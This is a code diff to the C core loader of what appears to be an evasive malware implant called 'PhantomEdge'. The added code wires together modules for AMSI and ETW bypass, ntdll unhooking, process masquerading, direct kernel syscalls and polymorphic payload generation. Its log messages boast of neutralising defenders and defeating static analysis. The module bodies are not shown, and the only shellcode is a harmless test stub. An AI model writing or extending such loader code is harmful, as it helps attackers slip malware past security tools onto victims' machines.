@@ -7,18 +7,31 @@
 #include "../include/evasion.h"  // For unhook_ntdll etc.
 #include "../include/rdi.h"      // For InvokeReflectiveLoader (will be called from here)
 #include "../include/strategy.h"  // For our new evasion strategy framework
+#include "../include/environment_chameleon.h"  // For boss-level process masquerading
+#include "../include/cynical_logger.h"  // For logging integration
+#include "../include/intelligent_bypass.h"  // For smart AMSI/ETW bypass
+#include "../include/kernel_direct_syscalls.h"  // For revolutionary kernel-level syscalls
+#include "../include/dynamic_payload_generator.h"  // For JIT code generation sorcery
+#include "../include/performance_profiler.h"  // For ultimate performance optimization
 // #include "payload.h"            // EMBEDDED PAYLOAD - Not used in current simplified version
 #ifdef _DEBUG
 #include <stdio.h>
 #endif
 #include <winternl.h>
 
-// --- No-CRT memcpy implementation ---
+// --- No-CRT implementations ---
 #pragma function(memcpy)
 void *memcpy(void *dst, const void *src, size_t n) {
     unsigned char *d = dst;
     const unsigned char *s = src;
     while (n--) *d++ = *s++;
+    return dst;
+}
+
+#pragma function(memset)
+void *memset(void *dst, int c, size_t n) {
+    unsigned char *d = dst;
+    while (n--) *d++ = (unsigned char)c;
     return dst;
 }
 
@@ -158,6 +171,139 @@ int CoreLoaderMain(void) {
         return -3;
     }
 
+    // === BOSS MODE INITIALIZATION ===
+    // Initialize Performance Profiler FIRST - monitor everything
+    if (!PerformanceProfiler_Initialize(OPT_LEVEL_AGGRESSIVE)) {
+        CynicalLog_Error("LOADER", "Performance Profiler initialization failed - no optimization available");
+        debug_message("Warning: Performance Profiler initialization failed");
+    } else {
+        CynicalLog_Info("LOADER", "Ultimate Optimization Engine activated - monitoring EVERYTHING");
+        debug_message("Performance Profiler online: Ready to optimize like a boss");
+        
+        // Start profiling the loader itself
+        PerformanceProfiler_StartProfiling(MODULE_CORE_LOADER);
+    }
+    
+    // Initialize Cynical Logger first
+    if (!CynicalLogger_Initialize(NULL)) {
+        // Non-critical failure - continue without logging
+        debug_message("Warning: Cynical Logger initialization failed");
+    } else {
+        CynicalLog_Info("LOADER", "PhantomEdge boss mode activated - stealth level MAXIMUM");
+    }
+
+    // Initialize Environment Chameleon - BOSS LEVEL STEALTH
+    LARGE_INTEGER chameleon_start = PerformanceProfiler_StartTiming();
+    if (!Chameleon_Initialize()) {
+        CynicalLog_Error("LOADER", "Environment Chameleon initialization failed - proceeding without masquerading");
+        debug_message("Warning: Environment Chameleon initialization failed");
+    } else {
+        CynicalLog_Info("LOADER", "PhantomEdge boss mode activated - stealth level MAXIMUM");
+        debug_message("Boss mode activated: Environment Chameleon online");
+    }
+    PerformanceProfiler_EndTiming(MODULE_ENVIRONMENT_CHAMELEON, chameleon_start, "initialization");
+
+    // Initialize Intelligent Bypass - SMART EVASION ARSENAL
+    LARGE_INTEGER bypass_start = PerformanceProfiler_StartTiming();
+    if (!IntelligentBypass_Initialize()) {
+        CynicalLog_Error("LOADER", "Intelligent Bypass initialization failed - proceeding without bypass");
+        debug_message("Warning: Intelligent Bypass initialization failed");
+    } else {
+        CynicalLog_Info("LOADER", "Smart evasion arsenal activated - AMSI/ETW bypass ready");
+        debug_message("Intelligent Bypass online: Ready to outsmart defenders");
+        
+        // Execute AMSI and ETW bypasses
+        PBYPASS_TECHNIQUE selected_techniques[8];
+        DWORD technique_count = IntelligentBypass_SelectOptimalTechniques(
+            BYPASS_TYPE_AMSI | BYPASS_TYPE_ETW,
+            selected_techniques,
+            8
+        );
+        
+        if (technique_count > 0) {
+            NTSTATUS bypass_status = IntelligentBypass_ExecuteTechniques(
+                selected_techniques[0], // Pass first technique pointer
+                technique_count
+            );
+            
+            if (NT_SUCCESS(bypass_status)) {
+                CynicalLog_Info("LOADER", "Bypass techniques executed successfully");
+                debug_message("Bypass successful: Defenders neutralized");
+            } else {
+                CynicalLog_Warn("LOADER", "Some bypass techniques failed - continuing anyway");
+                debug_message("Partial bypass: Some defenses still active");
+            }
+        }
+    }
+    PerformanceProfiler_EndTiming(MODULE_INTELLIGENT_BYPASS, bypass_start, "initialization");
+
+    // Initialize Kernel Direct Syscalls - REVOLUTIONARY KERNEL BYPASS
+    LARGE_INTEGER kernel_start = PerformanceProfiler_StartTiming();
+    if (!KernelSyscalls_Initialize()) {
+        CynicalLog_Error("LOADER", "Kernel Direct Syscalls initialization failed - using traditional methods");
+        debug_message("Warning: Kernel Direct Syscalls initialization failed");
+    } else {
+        CynicalLog_Info("LOADER", "Revolutionary kernel bypass activated - usermode hooks OBLITERATED");
+        debug_message("Kernel Direct Syscalls online: Bypassing usermode like a boss");
+        
+        // Test kernel syscall resolution
+        DWORD test_syscall_id = KernelSyscalls_ResolveSyscallId("NtAllocateVirtualMemory");
+        if (test_syscall_id != 0xFFFFFFFF) {
+            CynicalLog_Info("LOADER", "Kernel syscall resolution test PASSED - ID: 0x%X", test_syscall_id);
+            debug_message("Kernel syscall test: SUCCESS - Ready for direct kernel calls");
+        } else {
+            CynicalLog_Warn("LOADER", "Kernel syscall resolution test failed - falling back to traditional");
+            debug_message("Kernel syscall test: FAILED - Using fallback methods");
+        }
+    }
+    PerformanceProfiler_EndTiming(MODULE_KERNEL_SYSCALLS, kernel_start, "initialization");
+
+    // Initialize Dynamic Payload Generator - JIT CODE SORCERY
+    LARGE_INTEGER dyngen_start = PerformanceProfiler_StartTiming();
+    if (!DynamicPayload_Initialize()) {
+        CynicalLog_Error("LOADER", "Dynamic Payload Generator initialization failed - using static payloads");
+        debug_message("Warning: Dynamic Payload Generator initialization failed");
+    } else {
+        CynicalLog_Info("LOADER", "JIT Code Sorcery activated - static analysis DESTROYED");
+        debug_message("Dynamic Payload Generator online: Polymorphic code generation ready");
+        
+        // Test payload generation with dummy data
+        BYTE test_shellcode[] = { 0x90, 0x90, 0x90, 0x90, 0xC3 }; // nop; nop; nop; nop; ret
+        GENERATED_PAYLOAD test_generated = { 0 };
+        
+        NTSTATUS gen_status = DynamicPayload_Generate(
+            test_shellcode,
+            sizeof(test_shellcode),
+            &test_generated
+        );
+        
+        if (NT_SUCCESS(gen_status)) {
+            CynicalLog_Info("LOADER", "Payload generation test PASSED - size: %zu, entropy: %d%%", 
+                           test_generated.payload_size, test_generated.entropy_score);
+            debug_message("Payload generation test: SUCCESS - JIT engine operational");
+            
+            // Cleanup test payload
+            DynamicPayload_Free(&test_generated);
+        } else {
+            CynicalLog_Warn("LOADER", "Payload generation test failed: 0x%08X", gen_status);
+            debug_message("Payload generation test: FAILED - Using static methods");
+        }
+    }
+    PerformanceProfiler_EndTiming(MODULE_DYNAMIC_GENERATOR, dyngen_start, "initialization");
+
+    // Run comprehensive performance benchmark
+    CynicalLog_Info("LOADER", "Running comprehensive performance benchmark");
+    debug_message("Performance benchmark: Testing all systems");
+    
+    NTSTATUS benchmark_status = Benchmark_RunComprehensive();
+    if (NT_SUCCESS(benchmark_status)) {
+        CynicalLog_Info("LOADER", "Performance benchmark COMPLETED - all systems analyzed");
+        debug_message("Performance benchmark: SUCCESS - optimization data collected");
+    } else {
+        CynicalLog_Warn("LOADER", "Performance benchmark failed: 0x%08X", benchmark_status);
+        debug_message("Performance benchmark: FAILED - limited optimization available");
+    }
+
     // Initialize our Evasion Strategy module
     if (!Strategy_Initialize(ctx, ctx->strategy)) {
         // Critical failure: cannot initialize evasion strategy
@@ -199,6 +345,27 @@ int CoreLoaderMain(void) {
         debug_message("Embedded payload not found or is empty!");
     }
     */
+
+    // === BOSS MODE CLEANUP ===
+    CynicalLog_Info("LOADER", "PhantomEdge mission completed - cleaning up boss mode");
+    
+    // Cleanup Dynamic Payload Generator
+    DynamicPayload_Cleanup();
+    
+    // Cleanup Kernel Direct Syscalls
+    KernelSyscalls_Cleanup();
+    
+    // Cleanup Intelligent Bypass
+    IntelligentBypass_Cleanup();
+    
+    // Cleanup Environment Chameleon
+    Chameleon_Cleanup();
+    
+    // Cleanup Cynical Logger (with self-destruct if needed)
+    CynicalLogger_Shutdown(FALSE);
+    
+    // Cleanup Performance Profiler LAST - generate final report
+    PerformanceProfiler_Cleanup();
 
     // Loader has done its main job. 
     // The stub (RealEntry) will call NtTerminateProcess after this returns.
